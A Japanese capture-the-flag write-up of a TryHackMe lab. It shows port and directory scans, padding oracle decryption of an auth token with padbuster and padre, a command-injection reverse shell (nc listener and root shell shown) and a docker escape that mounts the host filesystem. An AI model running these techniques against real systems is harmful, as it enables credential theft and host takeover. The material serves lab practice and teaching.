# New York Flankees CTF

https://tryhackme.com/room/thenewyorkflankees

## Enumeration

```shell
TARGET=10.49.189.241
sudo bash -c "echo $TARGET   newyork >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,8080 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Octoshape P2P streaming web service
```

SSH, HTTP。見慣れないHTTPサービス。

トップページのスクリプト

```sh
<script>
    document.addEventListener('DOMContentLoaded', function() {
        // Check if the "isLoggedIn" cookie exists
        const isLoggedIn = document.cookie.includes('loggedin');

        // Get the admin login button element
        const adminLoginBtn = document.querySelector('.admin-login-btn');

        // If the "isLoggedIn" cookie exists, change the button text to "FINDME"
        if (isLoggedIn) {
            adminLoginBtn.textContent = 'DEBUG';
        }

        // Add event listener to the admin login button
        adminLoginBtn.addEventListener('click', function() {
            // If the user is not logged in, redirect to login.html
            if (!isLoggedIn) {
                window.location.href = 'login.html';
            } else {
                window.location.href = 'exec.html'
            }
        });
    });
</script>
```

### ディレクトリ列挙

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

root@ip-10-49-81-237:~# gobuster dir -q -x=txt,html -u http://$TARGET:8080 -w ./dirlist.txt -t 64 -k
/debug.html           (Status: 200) [Size: 2638]
/exec.html            (Status: 401) [Size: 0]
/favicon.ico          (Status: 200) [Size: 6538]
/http%3A              (Status: 200) [Size: 4332]
/**http%3a            (Status: 200) [Size: 4332]
/**http%3A            (Status: 200) [Size: 4332]
/*http%3A             (Status: 200) [Size: 4332]
/index.html           (Status: 200) [Size: 4332]
/login.html           (Status: 200) [Size: 2670]
```

### debug.html

パディングオラクルを示唆していると思われる。

```txt
Stefan Debug Page
TODO: Implement custom authentication
Your custom authentication implementation goes here.

TODO: Fix verbose error (padding)
Fix the verbose error related to padding.
```

ローカル80ポートに api エンドポイントがある。

```javascript
<script>
    function stefanTest1002() {
        var xhr = new XMLHttpRequest();
        var url = "http://localhost/api/debug";
        // Submit the AES/CBC/PKCS payload to get an auth token
        // TODO: Finish logic to return token
        xhr.open("GET", url + "/393536[REDACTED]", true);

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log("Response: ", xhr.responseText);
            } else {
                console.error("Failed to send request.");
            }
        };
        xhr.send();
    }
</script>
```

### exec.html

`loggedin`クッキーをセット、DEBUGを押して exec.html にアクセスしたら401エラーになった。

## パディングオラクル

http://newyork:8080/api/debug/393536[REDACTED] をリクエストすると、`Custom authentication success` と表示された。

HEX値を少しだけ変えてリクエストすると、`Decryption error` が返った。HEX値は暗号文であり、復号成功と失敗の見分けが可能であることが分かった。

パディングオラクル攻撃。

```sh
$ padbuster http://newyork:8080/api/debug/393536[REDACTED] 393536[REDACTED] 16 -encoding 2

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 29

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 4 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     29    N/A
2 **    255     500     16    N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (133/256) [Byte 16]
[+] Success: (250/256) [Byte 15]
[+] Success: (254/256) [Byte 14]
[+] Success: (174/256) [Byte 13]
[+] Success: (173/256) [Byte 12]
[+] Success: (245/256) [Byte 11]
[+] Success: (254/256) [Byte 10]
[+] Success: (248/256) [Byte 9]
[+] Success: (255/256) [Byte 8]
[+] Success: (246/256) [Byte 7]
[+] Success: (164/256) [Byte 6]
[+] Success: (168/256) [Byte 5]
[+] Success: (246/256) [Byte 4]
[+] Success: (163/256) [Byte 3]
[+] Success: (178/256) [Byte 2]
[+] Success: (166/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): ea0dcc6e567f96414433ddf5dc29cdd5
[+] Intermediate Bytes (HEX): 4a4153075457000800050d565601047a
[+] Plain Text: stefan1197:ebb2B
```

復号自体は成功しているが、短すぎる。padbusterでは1ブロック分だけしか表示されないため。

padreを実行してみる。全体の復号に成功。

```sh
$ ../../tools/padre -err 'Decryption error' -e lhex -u 'http://newyork:8080/api/debug/$' '393536[redacted]'
[i] padre is on duty
[i] using concurrency (http connections): 30
[+] padding oracle confirmed
[+] detected block length: 16
[!] mode: decrypt
[1/1] stefan1197:ebb2[REDACTED]\x0f\x0f\x0f\x0f\x0f\x0f\... [64/64] | reqs: 7466 (135/sec)
      [!] Output was too wide to fit to you terminal. Redirect STDOUT somewhere to get full output
```

この認証情報を使って、ログイン画面からログイン成功した。

## Debug

コマンドを入れると、OKとだけ表示される。  
コマンド名として不正な文字列を入れると500エラーになる。

curl や wget はリクエストが来ていることが分かった。また、`|` や `;` はフィルタリングされていると思われる。

python3のリバースシェルを`pysh`としてファイル保存、wget でアップロード、`bash pysh`実行でリバースシェルを取れた。

```sh
$ sudo nc -lnvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.138.236] from (UNKNOWN) [10.49.131.251] 40874
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

envコマンドでフラグを発見。

```sh
root@02e849f307cc:/# env
HOSTNAME=02e849f307cc
JAVA_HOME=/usr/local/openjdk-11
PWD=/
CTF_USERNAME=stefan1197
HOME=/root
LANG=C.UTF-8
CTF_DOCKER_FLAG=THM{[REDACTED]}
...
```

## dockerエスケープ

dockerコマンドがある。

```sh
root@02e849f307cc:/# which docker
/usr/bin/docker
```

```sh
root@02e849f307cc:/# docker images
REPOSITORY               TAG       IMAGE ID       CREATED         SIZE
padding-oracle-app_web   latest    cd6261dd9dda   19 months ago   1.01GB
<none>                   <none>    4187efabd0a5   19 months ago   704MB
gradle                   7-jdk11   d5954e1d9fa4   20 months ago   687MB
openjdk                  11        47a932d998b7   3 years ago     654MB
```

エスケープ成功。

```sh
root@02e849f307cc:/# docker run -v /:/mnt --rm -it openjdk:11 chroot /mnt sh

# ls -al
total 80
drwxr-xr-x  19 root root  4096 Dec 24 04:40 .
drwxr-xr-x  19 root root  4096 Dec 24 04:40 ..
-rw-r--r--   1 root root   200 Dec 24 04:40 .badr-info
lrwxrwxrwx   1 root root     7 Oct 26  2020 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Mar  8  2025 boot
drwxr-xr-x  17 root root  3260 Dec 24 04:41 dev
drwxr-xr-x 102 root root  4096 Dec 24 04:40 etc
-rw-r--r--   1 root root    70 May  8  2024 flag.txt
drwxr-xr-x   3 root root  4096 May  7  2024 home
lrwxrwxrwx   1 root root     7 Oct 26  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Oct 26  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Oct 26  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Oct 26  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct 26  2020 lost+found
drwxr-xr-x   2 root root  4096 Oct 26  2020 media
drwxr-xr-x   2 root root  4096 Oct 26  2020 mnt
drwxr-xr-x   3 root root  4096 May  7  2024 opt
dr-xr-xr-x 184 root root     0 Dec 24 04:40 proc
drwx------   4 root root  4096 Mar  8  2025 root
drwxr-xr-x  30 root root  1020 Dec 24 05:24 run
lrwxrwxrwx   1 root root     8 Oct 26  2020 sbin -> usr/sbin
drwxr-xr-x   9 root root  4096 Mar  8  2025 snap
drwxr-xr-x   2 root root  4096 Oct 26  2020 srv
dr-xr-xr-x  13 root root     0 Dec 24 04:40 sys
drwxrwxrwt  12 root root  4096 Dec 24 06:02 tmp
drwxr-xr-x  14 root root  4096 Oct 26  2020 usr
drwxr-xr-x  13 root root  4096 Oct 26  2020 var
```

## 振り返り

- パディングオラクルに抜き打ちで遭遇したのは初めてで、クリアできてうれしかった。
- padbuster は平文が長い場合に全体が表示されないため、最初から padre を使う方が良い。速度も padre の方が速い。
- RCEはフィルターにつまずいて少し苦労した。

## Tags

#tags:PaddingOracles #tags: #tags:docker
